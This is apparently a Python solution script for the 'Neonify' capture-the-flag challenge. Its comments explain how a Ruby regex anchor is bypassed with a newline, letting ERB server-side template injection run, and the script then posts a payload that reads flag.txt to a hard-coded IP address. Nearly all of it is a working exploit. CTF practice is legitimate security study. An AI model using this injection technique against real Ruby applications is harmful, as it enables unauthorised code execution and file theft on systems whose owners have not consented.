#!/usr/bin/evn python3

# Neonify

# Vulnerability:
# In neon.rb file, it outputs @neon value into the HTML rendering page using Ruby template binding (<%= %>)
# post '/' do
#     if params[:neon] =~ /^[0-9a-z ]+$/i
#       @neon = ERB.new(params[:neon]).result(binding)
#     else
#       @neon = "Malicious Input Detected"
#     end
#     erb :'index'
#   end

# There is a way to bypass the regex in Ruby if "Matches the end of the string unless the string ends with a ``\n'', in which case it matches just before the ``\n''."

# Reference:
# http://ruby-doc.com/docs/ProgrammingRuby/html/language.html#UJ

import requests
import urllib.parse

def connect(url):

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = "matching\n<%= File.open('flag.txt').read %>"
    # payload = urllib.parse.quote(payload)
    # print(payload)

    data = {
        "neon": payload
    }

    r = requests.post(url, headers=headers, data=data)
    print(r.status_code)
    print(r.text)


if __name__ == '__main__':
    url = "http://206.189.125.243:31101/"
    connect(url)